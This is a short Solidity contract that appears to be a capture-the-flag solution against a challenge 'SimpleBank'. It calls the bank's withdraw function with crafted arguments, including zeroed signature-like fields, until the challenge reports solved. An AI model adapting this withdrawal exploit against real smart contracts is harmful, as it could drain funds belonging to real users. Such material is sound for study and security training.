import "src/ISimpleBank.sol";
import "src/Challenge.sol";

contract ChallengeExploit {
    ISimpleBank public immutable bank;
    Challenge public challenge;
    uint256 public flag;

    constructor(Challenge challenge_) {
        challenge = Challenge(challenge_);
        bank = challenge.BANK();
    }

    function solve() external payable {
        bank.withdraw(bytes32(uint256(1)), 17, bytes32(0), bytes32(0));
        require(challenge.isSolved(), "not solved");
    }

    fallback() external payable {
        if (msg.value == 0) {
            revert();
        }
    }
}
